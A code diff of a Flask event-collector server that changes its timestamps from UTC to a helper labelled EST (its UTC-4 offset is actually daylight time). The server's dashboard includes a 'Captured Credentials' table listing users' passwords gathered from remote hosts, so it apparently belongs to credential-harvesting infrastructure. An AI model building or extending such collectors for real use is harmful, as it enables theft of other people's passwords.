@@ -1,7 +1,12 @@
 #!/usr/bin/env python3
 from flask import Flask, request, jsonify
-from datetime import datetime
+from datetime import datetime, timezone, timedelta
 import os, json, threading
+
+EST = timezone(timedelta(hours=-4))
+
+def _now_est():
+    return datetime.now(EST).strftime("%Y-%m-%d %H:%M:%S EST")
 
 app = Flask(__name__)
 
@@ -42,7 +47,7 @@ def _upsert(event: dict, persist=True):
     host     = event.get("host_ip", "unknown")
     user     = event.get("user", "unknown")
     etype    = event.get("event_type", "unknown")
-    received = event.get("received_at", datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"))
+    received = event.get("received_at", _now_est())
     data     = event.get("data", {})
 
     with store_lock:
@@ -96,7 +101,7 @@ def receive_status():
     host     = data.get("host_ip", "unknown")
     event    = data.get("event", "unknown")
     ts       = data.get("timestamp", "")
-    received = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+    received = _now_est()
     with store_lock:
         warning_store[host] = {
             "event":       event,
@@ -130,7 +135,7 @@ def receive_sync():
     users = data.get("users", [])
     if not isinstance(users, list):
         return jsonify({"ok": False}), 400
-    received = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
+    received = _now_est()
     with store_lock:
         user_store[host] = {
             "users":       users,
@@ -149,7 +154,7 @@ def receive_event():
         "user":        data.get("user", "unknown"),
         "event_type":  data.get("event_type", "unknown"),
         "host_ts":     data.get("timestamp", ""),
-        "received_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
+        "received_at": _now_est(),
         "data":        data.get("data", {}),
     }
     _upsert(event)
@@ -266,7 +271,7 @@ def render_activity_section(ip, etype, entries):
       </div>
       <div class="act-body" id="{uid}_body">
         <table class="act-table">
-          <thead><tr><th>User</th><th>Detail</th><th>Time (UTC)</th></tr></thead>
+          <thead><tr><th>User</th><th>Detail</th><th>Time (EST)</th></tr></thead>
           <tbody id="{uid}_rows">{rows}</tbody>
         </table>
         {show_more}
@@ -329,7 +334,7 @@ def render_host_card(ip, hostname):
         <div class="cred-block">
           <div class="block-title">Captured Credentials <span class="act-count">{len(creds)}</span></div>
           <table class="cred-table">
-            <thead><tr><th>User</th><th>Password</th><th>Source</th><th>Captured (UTC)</th></tr></thead>
+            <thead><tr><th>User</th><th>Password</th><th>Source</th><th>Captured (EST)</th></tr></thead>
             <tbody>{cred_rows}</tbody>
           </table>
         </div>"""
